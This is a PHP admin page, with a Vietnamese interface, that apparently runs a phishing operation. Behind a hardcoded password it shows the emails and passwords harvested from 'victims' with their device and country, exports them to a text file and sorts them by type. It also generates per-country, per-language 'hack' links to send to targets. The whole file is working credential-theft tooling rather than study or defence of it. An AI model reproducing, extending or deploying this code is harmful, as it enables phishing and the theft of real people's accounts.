﻿<?
date_default_timezone_set('Asia/Ho_Chi_Minh');
include_once "sql.php";
$root_pass="194377624";
session_start();
include_once "sql.php";
$login=isset($_SESSION['login'])?$_SESSION['login']:0;
$lastTime=isset($_SESSION['time'])?$_SESSION['time']:0;
if(time()-$lastTime>1200) $login=0;
?>

<!DOCTYPE HTML>
<html>
<head>
	<meta http-equiv="content-type" content="text/html" />
	<meta name="author" content="" />
    <meta charset="utf-8" />
    <script type="text/javascript" src="jquery.js"></script>
	<title>Xem nick</title>
    <style>
    a{
        text-decoration: none;
        color: blue;
    }
    a:hover{
        color: red;
    }
    td{
        border: 1px solid #fcd;
        padding: 1px;
        margin: 1px;
    }
    #ms{
    color: lime;
    font-weight: bold;
    position: fixed;
    display: none;
    border: 1px solid green;
    background: #eee;
    padding: 2px;
}
    </style>
</head>

<body>
<script>
x=0;
y=0;
document.onmousemove=function(event){
    x=event.clientX;
    y=event.clientY;
}
function rCopy(e)
{
    e.select();
    var successful = document.execCommand('copy');
    if(successful)
    {
        ms=document.getElementById("ms");
        ms.innerHTML="Đã copy";
        ms.style.display="block";
        ms.style.top=(y-18)+"px";
        ms.style.left=(x+10)+"px";
        setTimeout(function(){
            ms.style.display="none";
            
        },700)
    }
}
</script>
<div id="ms">Đã copy</div>

<?

if($login==0)
{
    $pass=isset($_POST['pass'])?$_POST['pass']:"";
    if($pass=="")
    {
        showForm(true);
    }else
    {
        if($pass==$root_pass)
        {
            $_SESSION['login']=1;
            showContent();
            
        }else{
            showForm(false);
        }
    }
}else{
    showContent();
}
function showForm($ag)
{
    ?>
    <form action="setting.php" method="POST">
     <b>Nhập mật khẩu để tiếp tục: </b><br />
     <input type="password" name="pass"  />
     <input type="submit" value="OK" /><br />
    <?if(!$ag) echo "<b style='color:red'>Sai mật khẩu!</b>"; ?>
    </form>
   
    
    <?
}
function showContent()
{
    global $listct;
    $_SESSION['time']=time();
    $ac=isset($_GET['ac'])?$_GET['ac']:"no";
    
    if($ac=="no")
    {
        ?>
        <a href="setting.php?ac=view">Xem nick</a><br />
        <a href="setting.php?ac=country">Lấy link quốc gia</a><br />
        <a href="setting.php?ac=type">Cài đặt các loại nick</a><br />
        <a href="setting.php?ac=out">Thoát khỏi hệ thống</a>
        <?
    }else if($ac=="view")
    {

        $mac=isset($_GET['mac'])?$_GET['mac']:"no";
        if($mac=="no")
        {
            ?>
            <div>
            <input type="button" value="Xuất ra tệp tin txt" onclick="backup();" />
            <input type="button" value="Xóa tất cả nick hiện tại" onclick="rclear();" />
            <script>
            function backup()
            {
                location.href="ajax.php?ac=export"
            }
            function rclear()
            {
                if(confirm("Xác nhận xóa tất cả nick?")) location.href="ajax.php?ac=clear"
            }
            
            </script>
            
            </div>
            <table>
            <tr>
            <td style="text-align: center;">Tài khoản</td>
            
            <td style="text-align: center;">Thông tin</td>
            
            <td style="text-align: center;">Đánh dấu</td>
            <td></td>
            </tr>
            
            <?
            $nick=readNick();
            $n=count($nick);
            for($i=0;$i<$n;$i++)
            {
                $mnick=$nick[$i];
                $id=$mnick['id'];
                $email=$mnick['email'];
                $pass=$mnick['pass'];
                $country=isset($mnick['country'])?$mnick['country']:"";
                if($country!="") $country=country_code_to_country($country);
                $mobile=($mnick['mobile']==0)?"Máy tính":"Điện thoại";
                $type=$mnick['type'];
                $type=selectType($type);
                $color=$type['color'];
                $name=$type['name'];
                $date=Date('H:i:s-d/m/Y ',$mnick['time']);
                
                ?>
                <tr id="tr<?=$id?>">
                <td >
                <p>
                    <a id="anick<?=$id?>"  style="color: <?=$color?>;">Nick: </a>
                    <input id="nick<?=$id?>" onclick="rCopy(this)" readonly="1" style="color: <?=$color?>;" type="text" value="<?=$email?>" />
                </p>
                <p>
                    <a id="apass<?=$id?>"  style="color: <?=$color?>;">Pass: </a>
                    <input id="pass<?=$id?>" onclick="rCopy(this)"  readonly="1" style="color: <?=$color?>;" type="text" value="<?=$pass?>" />
                </p>
                    
                    
                    
                    
                </td>
                <td>
                Thiết bị: <?=$mobile?><br />
                Quốc Gia: <?=$country?><br />
                Thời gian: <?=$date?>
                
                </td>
                <td>
                <?
                $listType=readType();
                $mn=count($listType);
                for($j=0;$j<$mn;$j++)
                {
                    $mtype=$listType[$j];
                    $mid=$mtype['id'];
                    $mcolor=$mtype['color'];
                    $mname=$mtype['name'];
                    ?>
                    <p style="display: inline-block; ">
                    <input id="x<?=$id?>_<?=$mid?>" name="l<?=$id?>" type="radio" <?if($mnick['type']==$mid) echo "checked"?>  onclick="setType(<?=$id?>,<?=$mid?>)"/>
                    <label for="x<?=$id?>_<?=$mid?>" style="color: <?=$mcolor?>;"><?=$mname?></label>
                    </p>
                    <?
                }
                ?>
                </td>
                <td>
                <a style="color: red;" href="javascript:xoa(<?=$id?>)">Xóa</a>
                
                </td>
                </tr>
                
                <?
                
            }
            ?>
            
            </table>
            <a href="setting.php">Quay lại</a>
            <script>
            function setType(id,type)
            {
                console.log(id,type);
                $.get("ajax.php?ac=typenick&id="+id+"&type="+type,function(data,status){
                    if(data=="OK")
                    {
                        $("#anick"+id).css("color",listType[type]);
                        $("#nick"+id).css("color",listType[type]);
                        $("#apass"+id).css("color",listType[type]);
                        $("#pass"+id).css("color",listType[type]);
                    }else{
                        location.reload();
                    }
                    
                    
                });
            }
            function xoa(id)
            {
                if(confirm("Xóa nick này?"))
                {
                    $.get("ajax.php?ac=xoanick&id="+id,function(data,status){
                        
                        if(data.indexOf("OK")>-1)
                        {
                        $("#tr"+id).hide();
                        }else{
                            location.reload();
                        }
                        
                        
                        
                    });
                }
            }
            </script>
            <script>
            listType=new Array();
<?
            $listType=readType();
                $mn=count($listType);
                for($j=0;$j<$mn;$j++)
                {
                    $mtype=$listType[$j];
                    $mid=$mtype['id'];
                    $mcolor=$mtype['color'];
                    $mname=$mtype['name'];
                    echo "            listType[$mid]='$mcolor';\n";
                }
            ?>
            
            </script>
            <?
        }
    }else if($ac=="country")
    {
        $mac=isset($_GET['mac'])?$_GET['mac']:"no";
        ?>
        Chọn quốc gia: 
        <select onchange="rela(this.value)">
        <option value="auto">Tự động hiển thị</option>
        <?
        $listfull="az_AZ,id_ID,ms_MY,jv_ID,cx_PH,bs_BA,br_FR,ca_ES,cs_CZ,cy_GB,da_DK,de_DE,et_EE,en_PI,en_GB,en_UD,en_US,es_LA,es_CO,es_ES,eo_EO,eu_ES,tl_PH,fo_FO,fr_CA,fr_FR,fy_NL,ga_IE,gl_ES,gn_PY,hr_HR,rw_RW,is_IS,it_IT,sw_KE,ku_TR,lv_LV,fb_LT,lt_LT,la_VA,hu_HU,nl_NL,nl_BE,nb_NO,nn_NO,uz_UZ,pl_PL,pt_BR,pt_PT,ro_RO,sq_AL,sk_SK,sl_SI,fi_FI,sv_SE,vi_VN,tr_TR,el_GR,be_BY,bg_BG,kk_KZ,mk_MK,mn_MN,ru_RU,sr_RS,tg_TJ,uk_UA,ka_GE,hy_AM,he_IL,ur_PK,ar_AR,ps_AF,fa_IR,cb_IQ,ne_NP,mr_IN,hi_IN,as_IN,bn_IN,pa_IN,gu_IN,or_IN,ta_IN,te_IN,kn_IN,ml_IN,si_LK,th_TH,my_MM,km_KH,ko_KR,zh_TW,zh_CN,zh_HK,ja_JP,ja_KS";
        $listfull=explode(",",$listfull);
        for($i=0;$i<count($listfull);$i++)
        {
            $r=$listfull[$i];
            $rr=explode("_",$r);
            echo "<option value='$r'>Quốc gia {$listct[$rr[1]]}, Ngôn ngữ: {$rr[0]}</option>";
        }
        
        ?>
        
        </select><br />
        <input type="checkbox" id="zz" value="0" onclick="check(this.checked)"/>
        <a style="cursor: pointer;" onclick="document.getElementById('zz').click();check(document.getElementById('zz').checked)">Luôn hiển thị giao diện điện thoại</a>
        <br />(Nếu chọn tùy chọn này, dù nạn nhân có đang truy cập bằng máy tính thì hệ thống vẫn hiển thị giao diện điện thoại)
        <hr />
        Link hack: <input onclick="this.select()" type="text" readonly="true" value="" id="rs" size="60" /> <br />
        <hr />
        Link tự động nhận quốc gia và thiết bị: <input onclick="this.select()" type="text" readonly="true" value="" id="re" size="60" /><br />
        (Lưu ý: Đối với những host giá rẻ hoặc host miễn phí, nếu sử dụng link tự động thì khi online lên cao sẽ không tải được)<br />
        <hr /> 
        <a href="setting.php">Quay lại</a>
        <script>
        rootLink=location.href.replace("setting.php?ac=country","")
        document.getElementById("re").value=rootLink;
        document.getElementById("rs").value=rootLink;
        rootLink+="?t=set";
        
        ct="auto";
        mobile=false;
        
        function rela(x)
        {
            ct=x;
            showlink();
        }
        function check(bl)
        {
            mobile=(bl)?1:0;
            showlink();
        }
        function showlink()
        {
            coca=rootLink;
            if(ct!="auto")
            {
                coca+="&lang="+ct;
            }
            if(mobile)
            {
                coca+="&mobile="+mobile;
            }
            document.getElementById("rs").value=coca;
        }
        
        
        </script>
        <?
        die();
        //------------------------------------------------------------------------------
        if($mac=="no")
        {
            $data=readCountry();
            $n=count($data);
            if($n==0) echo "<p>Chưa có quốc gia nào!</p>";
            else{
                ?>
                    <p>Danh sách các quốc gia hiện tại</p>
                    <table>
                    <tr>
                        <td>Mã</td>
                        <td>Tên</td>
                        <td>Phiên bản</td>
                        <td></td>
                        <td></td>
                        <td></td>
                    </tr>
                    
                    <?
                    for($i=0;$i<$n;$i++)
                    {
                        $mct=$data[$i];
                        ?>
                        <tr>
                            <td><?=$mct['country']?></td>
                            <td><?=country_code_to_country($mct['country'])?></td>
                            <td><?=($mct['mobile']==1)?"Điện thoại":"Máy tính";?></td>
                            <td><a href="javascript:xemtruoc(<?=$mct['id']?>)">Xem trước</a></td>
                            <td><a href="javascript:sua(<?=$mct['id']?>)">Chỉnh sửa</a></td>
                            <td><a href="javascript:xoa(<?=$mct['id']?>)">Xóa</a></td>
                        </tr>
                        <?
                    }
                    ?>
                    </table>
                    <a href="setting.php?ac=country&mac=add">Thêm quốc gia</a>
                    <a href="setting.php">Quay lại</a>
                    <script>
                    function xemtruoc(id)
                    {
                        window.open("xemtruoc.php?id="+id,"","width=300,height=300");
                    }
                    function sua(id)
                    {
                        window.open("sua.php?id="+id);
                    }
                    function xoa(id)
                    {
                        if(confirm("Xác nhận xóa ?")); 
                        location.href="setting.php?ac=country&mac=xoa&id="+id;
                    }
                    </script>
                <?
            }
            
        }else if($mac=="add")
        {
             ?>
             <p>Chọn một ngôn ngữ
            <select id="country">
            <?
            foreach($listct as $ct=>$name)
            {
                echo "<option value='$ct' >$name</option>";
            }
            ?> 
            </select>
            </p>
            <p>Chọn phiên bản: 
            <select id="mobile">
            <option value="1">Điện thoại</option>
            <option value="0">Máy tính</option>
            </select></p>
            <input  type="submit" onclick="them()" value="OK" /><br />
            <a href="setting.php?ac=country">Quay lại</a>
            <script>
            function gid(x)
            {
                return document.getElementById(x);
            }
            function them()
            {
                window.open("add_country.php?country="+gid("country").value+"&mobile="+gid("mobile").value);
            }
            </script>
             <?       
        }else if($mac=="xoa")
        {
            deleteCountry($_GET['id']);
            meta();
            jsLocationAlert("Đã xóa!","setting.php?ac=country");
        }
    }else if($ac=="type")
    {
        $mac=isset($_GET['mac'])?$_GET['mac']:"no";
        if($mac=="no")
        {
            
            ?>
            <table>
            <tr>
            <td>Loại</td>
            <td>Màu</td>
            <td></td>
            </tr>
            <?
            $data=readType();
            $n=count($data);
            for($i=0;$i<$n;$i++)
            {
                $mdata=$data[$i];
                $id=$mdata['id'];
                $name=$mdata['name'];
                $color=$mdata['color'];
                ?>
                <tr id="tr<?=$id?>">
                <td><input id="t<?=$id?>" readonly="" type="text" value="<?=$name?>" /></td>
                <td><input id="c<?=$id?>" readonly="" type="text" value="<?=$color?>" /></td>
                <td id="td<?=$id?>">
                <a id="xong<?=$id?>" style="display: none;" href="javascript: xong(<?=$id?>)">OK</a>
                
                <span <?if($id==0) echo 'style="display: none;"';?> id="sp<?=$id?>">
                    <a id="s<?=$id?>" href="javascript: sua(<?=$id?>);">Sửa</a> - 
                    <a id="x<?=$id?>" href="javascript: xoa(<?=$id?>);">Xóa</a>
                </span>
                
                </td>
                </tr>
                <?
            }
            ?>
            <tr id="new" style="display: none;">
            <td><input type="text" id="names" /></td>
            <td><input type="text" id="colors" /></td>
            <td><input type="button" value="OK" onclick="themxong()" /></td>
            </tr>
            </table>
            <a href="javascript:them()">Thêm loại mới</a> - 
            <a href="setting.php">Quay lại</a>
            <script>
            function sua(id)
            {
                $("#xong"+id).show();
                $("#sp"+id).hide();
                
                $("#t"+id).removeAttr("readonly");
                $("#t"+id).focus();
                $("#c"+id).removeAttr("readonly");
                
            }
            function xong(id)
            {
                var name=$("#t"+id).val(), color=$("#c"+id).val();color=color.replace("#","pp");
                $.get("ajax.php?ac=type&mac=edit&id="+id+"&name="+name+"&color="+color,function(data,status){
                $("#xong"+id).hide();
                $("#sp"+id).show();
                
                $("#t"+id).attr("readonly","true");
                $("#c"+id).attr("readonly","true");
                
                });
            }
            function them()
            {
                $("#new").show();
                
            }
            function themxong()
            {
                var name=$("#names").val();
                var color=$("#colors").val();
                if(name.length * color.length==0) {
                    alert("Hãy nhập thông tin!");return;
                }
                color=color.replace("#","pp");
                $.get("ajax.php?ac=type&mac=add&name="+name+"&color="+color,function(data,status){
                    location.reload();
                
                });
            }
            function xoa(id)
            {
                location.href="setting.php?ac=type&mac=xoa&id="+id;
            }
            </script>
            <?
        }else if($mac=="xoa"){
            //Tìm xem có nick nào đang như thế ko
            $id=(isset($_GET['id']))?$_GET['id']:"";
            $nick=readNick();
            $not=true;
            for($i=0;$i<count($nick);$i++)
            {
                $mnick=$nick[$i];
                if($mnick['type']==$id)
                {
                    $not=false;break;
                }
            }
            if($not)
            {
                ?>
                <p>Xác nhận <a style="color: red;">xóa</a> loại này?</p>
                <p><a href="setting.php?ac=type&mac=xoaOK&id=<?=$id?>">Xóa</a> - 
                <a href="setting.php?ac=type">Không Xóa</a>
                
                </p>
                <?
            }else{
                ?>
                <p>Một số nick đang được đánh dấu bởi loại này!</p>
                <p>
                <a href="setting.php?ac=type&mac=xoahet&id=<?=$id?>">Xóa luôn những nick đó?</a> hoặc
                <a href="setting.php?ac=type&mac=xoavua&id=<?=$id?>">Chuyển những nick đó qua một loại khác</a>
                </p>
                <p><a href="setting.php?ac=type">Quay lại</a></p>
                <?
            }
            
        }else if($mac=="xoaOK"){
            $id=(isset($_GET['id']))?$_GET['id']:"";
            deleteType($id);
            jsLocationAlert("Đã xóa!","setting.php?ac=type");
            
        }else if($mac=="xoahet")
        {
            
            $id=(isset($_GET['id']))?$_GET['id']:"";
            $nick=readNick();
            
            $arrNick=array();
            for($i=0;$i<count($nick);$i++)
            {
                if($nick[$i]['type']==$id) $arrNick[]=$nick[$i]['id']; 
                
            }
            for($i=0;$i<count($arrNick);$i++) deleteNick($arrNick[$i]);
            deleteType($id);
            jsLocationAlert("Đã xóa loại này và tất cả những nick liên quan!","setting.php?ac=type");
        }else if($mac=="xoavua")
        {
            $id=(isset($_GET['id']))?$_GET['id']:"";
            ?>
            <form action="setting.php">
            <p>Chọn một loại để chuyển qua:
            <select name="move">
            <?
            $type=readType();
            for($i=0;$i<count($type);$i++)
            {
                $mtype=$type[$i];
                $mid=$mtype['id'];
                $name=$mtype['name'];
                if($mid!=$id)
                {
                    echo "<option value='$mid'>$name</option>";
                }
            }
            ?>
            </select>
            <input type="hidden" value="<?=$id?>" name="id" />
            <input type="hidden" value="xoamove" name="mac" />
            <input type="hidden" value="type" name="ac" />
            <input type="submit" value="OK" />
            </p>
            </form>
            <a href="setting.php?ac=type">Quay lại</a>
            <?
        }else if($mac=="xoamove")
        {
            $id=(isset($_GET['id']))?$_GET['id']:"";
            $move=(isset($_GET['move']))?$_GET['move']:"";
            $nick=readNick();
            for($i=0;$i<count($nick);$i++)
            {
                $mnick=$nick[$i];
                $mid=$mnick['id'];
                $mtype=$mnick['type'];
                if($mtype==$id)
                {
                    modifyNick($mid,"type",$move);
                }
            }
            deleteType($id);
            jsLocationAlert("Đã xóa và di chuyển thành công!","setting.php?ac=type");
        }
    }else if($ac=="redirect" && false) //remove
    {
        $url=isset($_GET['url'])?$_GET['url']:"no";
        $caidat=false;
        if($url!="no")
        {
            file_put_contents("location.txt",$url);
            $caidat=true;
        }
        $url=file_get_contents("location.txt");
        ?>
        <form >
        <p>Sau khi đăng nhập nick, sẽ chuyển hướng đến URL này
        <input type="hidden" value="redirect" name="ac" />
        <input type="text" size="<?=strlen($url);?>" name="url" value="<?=$url?>" />
        <input type="submit" value="OK" />
        <br />
        <?if($caidat):?>
        <b style="color: green;">Lưu thành công!</b>
        <?endif?>
        <a href="setting.php">Quay lại</a>
        </p>
        </form>
        <?
        
    }else if($ac=="out")
    {
        session_destroy();
        jsLocation("setting.php");
    }
}
?>


</body>
</html>




















